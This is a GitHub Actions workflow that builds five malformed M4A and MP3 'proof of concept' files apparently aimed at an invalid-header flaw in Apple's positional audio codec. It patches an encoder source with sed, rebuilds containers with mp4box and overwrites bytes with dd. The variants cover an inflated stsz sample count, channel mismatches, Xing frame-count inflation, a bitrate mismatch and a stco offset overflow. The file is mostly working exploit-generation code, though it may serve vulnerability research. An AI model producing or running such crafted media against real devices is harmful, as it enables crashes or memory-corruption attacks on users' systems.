name: Generate PoC Audio Files

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-and-generate:
    runs-on: macos-latest
    timeout-minutes: 30

    steps:
      # Clone the repository
      - name: Clone repository
        run: |
          echo "Cloning repository at $(date)"
          git clone https://github.com/encryptedcoderr/AppleTest/
          cd AppleTest/apple-positional-audio-codec-invalid-header-main
          echo "Listing directory contents at $(date)"
          ls -l
          echo "Repository cloned and directory listed at $(date)"

      # Cache FFmpeg
      - name: Cache FFmpeg
        uses: actions/cache@v4
        with:
          path: /usr/local/bin/ffmpeg
          key: ffmpeg-${{ runner.os }}-2025-06
          restore-keys: ffmpeg-${{ runner.os }}-

      # Install FFmpeg
      - name: Install FFmpeg
        run: |
          echo "Installing FFmpeg at $(date)"
          if ! command -v ffmpeg &> /dev/null; then
            brew install ffmpeg
          else
            echo "FFmpeg already installed"
          fi
          echo "FFmpeg installed at $(date)"

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '16.1'

      # Create generate_pocs.swift
      - name: Create generate_pocs.swift
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating generate_pocs.swift at $(date)"
          cat << 'EOF' > generate_pocs.swift
          import AVFoundation
          import Foundation
          import CoreMedia

          func generateBaseM4A(filename: String, duration: Double, channels: Int, sampleRate: Double) throws {
              let outputURL = URL(fileURLWithPath: filename)
              let format = AVAudioFormat(standardFormatWithSampleRate: sampleRate, channels: UInt32(channels))!
              let frameCount = UInt32(duration * sampleRate)
              let buffer = AVAudioPCMBuffer(pcmFormat: format, frameCapacity: frameCount)!
              buffer.frameLength = frameCount
              if let floatData = buffer.floatChannelData {
                  for channel in 0..<Int(format.channelCount) {
                      memset(floatData[channel], 0, Int(frameCount) * MemoryLayout<Float>.size)
                  }
              }
              let writer = try AVAssetWriter(outputURL: outputURL, fileType: .m4a)
              let settings: [String: Any] = [
                  AVFormatIDKey: kAudioFormatMPEG4AAC,
                  AVSampleRateKey: sampleRate,
                  AVNumberOfChannelsKey: channels,
                  AVEncoderBitRateKey: 128000
              ]
              let audioInput = AVAssetWriterInput(mediaType: .audio, outputSettings: settings)
              writer.add(audioInput)
              writer.startWriting()
              writer.startSession(atSourceTime: .zero)
              var formatDesc: CMAudioFormatDescription?
              let asbd = format.streamDescription
              CMAudioFormatDescriptionCreate(allocator: kCFAllocatorDefault,
                                            asbd: asbd,
                                            layoutSize: 0,
                                            layout: nil,
                                            magicCookieSize: 0,
                                            magicCookie: nil,
                                            extensions: nil,
                                            formatDescriptionOut: &formatDesc)
              var sampleBuffer: CMSampleBuffer?
              let blockBufferLength = Int(frameCount) * Int(format.channelCount) * MemoryLayout<Float>.size
              var blockBuffer: CMBlockBuffer?
              CMBlockBufferCreateWithMemoryBlock(allocator: kCFAllocatorDefault,
                                                memoryBlock: buffer.floatChannelData![0],
                                                blockLength: blockBufferLength,
                                                blockAllocator: kCFAllocatorNull,
                                                customBlockSource: nil,
                                                offsetToData: 0,
                                                dataLength: blockBufferLength,
                                                flags: 0,
                                                blockBufferOut: &blockBuffer)
              let timing = CMSampleTimingInfo(duration: CMTime(value: 1, timescale: Int32(sampleRate)),
                                             presentationTimeStamp: .zero,
                                             decodeTimeStamp: .invalid)
              CMSampleBufferCreate(allocator: kCFAllocatorDefault,
                                  dataBuffer: blockBuffer,
                                  dataReady: true,
                                  makeDataReadyCallback: nil,
                                  refcon: nil,
                                  formatDescription: formatDesc,
                                  sampleCount: CMItemCount(frameCount),
                                  sampleTimingEntryCount: 1,
                                  sampleTimingArray: [timing],
                                  sampleSizeEntryCount: 0,
                                  sampleSizeArray: nil,
                                  sampleBufferOut: &sampleBuffer)
              audioInput.append(sampleBuffer!)
              audioInput.markAsFinished()
              writer.finishWriting {
                  print("Generated \(filename)")
              }
              while writer.status == .writing {
                  Thread.sleep(forTimeInterval: 0.1)
              }
              if writer.status == .failed {
                  throw writer.error ?? NSError(domain: "AVAssetWriter", code: -1, userInfo: nil)
              }
          }

          func main() {
              let sampleRate = 44100.0
              let duration = 1.0
              let channels = 2
              for i in 1...5 {
                  let filename = "base_poc\(i).m4a"
                  do {
                      try generateBaseM4A(filename: filename, duration: duration, channels: channels, sampleRate: sampleRate)
                  } catch {
                      print("Error generating \(filename): \(error)")
                      exit(1)
                  }
              }
          }

          main()
          EOF
          ls -l generate_pocs.swift
          echo "generate_pocs.swift created at $(date)"

      # Create PoC source files
      - name: Create PoC source files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating PoC source files at $(date)"
          # PoC 1: Inflated Sample Count in stsz
          cp encodeme.mm encodeme_poc1.mm
          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/8192/' encodeme_poc1.mm
          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/1024 * channelNum * sizeof(float)/' encodeme_poc1.mm
          
          # PoC 2: esds Channel Configuration Mismatch
          cp encodeme.mm encodeme_poc2.mm
          sed -i '' '/mChannelsPerFrame = channelNum/ s/channelNum/8/' encodeme_poc2.mm
          sed -i '' '/mNumberChannels = channelNum/ s/channelNum/1/' encodeme_poc2.mm
          sed -i '' '/kAudioChannelLayoutTag_Stereo/ s/Stereo/HOA_ACN_SN3D | 0x8/' encodeme_poc2.mm
          
          # PoC 3: Xing Header Frame Count Inflation
          cp encodeme.mm encodeme_poc3.mm
          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/2000/' encodeme_poc3.mm
          
          # PoC 4: Frame Header Bitrate Mismatch
          cp encodeme.mm encodeme_poc4.mm
          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/(144000 \/ 1000 * 64 * channelNum)/' encodeme_poc4.mm
          
          # PoC 5: stco Offset Overflow
          cp encodeme.mm encodeme_poc5.mm
          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/4096/' encodeme_poc5.mm
          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/100/' encodeme_poc5.mm
          
          ls -l encodeme_poc*.mm
          echo "PoC source files created at $(date)"

      # Generate base M4A files
      - name: Generate base M4A files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Generating base M4A files at $(date)"
          swift generate_pocs.swift
          ls -l base_poc*.m4a
          echo "Base M4A files generated at $(date)"

      # Manipulate M4A files for PoCs
      - name: Manipulate M4A files for PoCs
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Manipulating M4A files for PoCs at $(date)"
          # Install mp4box
          brew install gpac
          # PoC 1: Inflate stsz sample count
          cp base_poc1.m4a poc1.m4a
          mp4box -raw 1 poc1.m4a -out temp.aac
          mp4box -add temp.aac:srate=44100:ch=2:frames=8192 poc1_modified.m4a
          mv poc1_modified.m4a poc1.m4a
          
          # PoC 2: esds channel mismatch
          cp base_poc2.m4a poc2.m4a
          mp4box -raw 1 poc2.m4a -out temp.aac
          mp4box -add temp.aac:srate=44100:ch=8 poc2_modified.m4a
          mv poc2_modified.m4a poc2.m4a
          
          # PoC 3: Prepare for Xing metadata
          cp base_poc3.m4a poc3.m4a
          
          # PoC 4: Bitrate mismatch
          cp base_poc4.m4a poc4.m4a
          
          # PoC 5: stco offset overflow
          cp base_poc5.m4a poc5.m4a
          # Simplified stco manipulation (requires custom tool for precision)
          printf '\xFF\xFF\xFF\xFF' | dd of=poc5.m4a bs=1 seek=1200 conv=notrunc 2>/dev/null
          
          ls -l poc*.m4a
          echo "M4A files manipulated at $(date)"

      # Convert M4A to MP3
      - name: Convert M4A to MP3
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Converting M4A to MP3 at $(date)"
          for poc in {1..5}; do
            if [ -f poc${poc}.m4a ]; then
              if [ $poc -eq 3 ]; then
                echo "Adding Xing metadata for PoC 3"
                ffmpeg -i poc3.m4a -c:a mp3 -b:a 128k -ac 1 -metadata frames=20000 poc3.mp3
              elif [ $poc -eq 4 ]; then
                echo "Setting high bitrate for PoC 4"
                ffmpeg -i poc4.m4a -c:a mp3 -b:a 320k -ac 1 poc4.mp3
              else
                ffmpeg -i poc${poc}.m4a -c:a mp3 -b:a 128k -ac 1 poc${poc}.mp3
              fi
              if [ $? -eq 0 ]; then
                echo "Conversion successful for poc${poc}.mp3"
              else
                echo "Conversion failed for poc${poc}.mp3"
                exit 1
              fi
            else
              echo "poc${poc}.m4a not found"
              exit 1
            fi
          done
          echo "M4A to MP3 conversion completed at $(date)"

      # Verify generated files
      - name: Verify generated files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Checking for generated files at $(date)"
          for poc in {1..5}; do
            for ext in m4a mp3; do
              if [ -f poc${poc}.${ext} ]; then
                FILE_SIZE=$(stat -f %z poc${poc}.${ext} 2>/dev/null || stat -c %s poc${poc}.${ext} 2>/dev/null)
                echo "poc${poc}.${ext} size: $FILE_SIZE bytes"
                if [ "$FILE_SIZE" -eq 0 ]; then
                  echo "Error: poc${poc}.${ext} is 0 bytes"
                  exit 1
                fi
                ffprobe -i poc${poc}.${ext} -show_format -show_streams -print_format json 2>/dev/null || echo "ffprobe failed for poc${poc}.${ext}"
              else
                echo "poc${poc}.${ext} not found"
                exit 1
              fi
            done
          done
          echo "Generated files verified at $(date)"

      # Upload artifacts
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: poc-audio-files
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/encodeme_poc*.mm
          retention-days: 7
          if-no-files-found: error
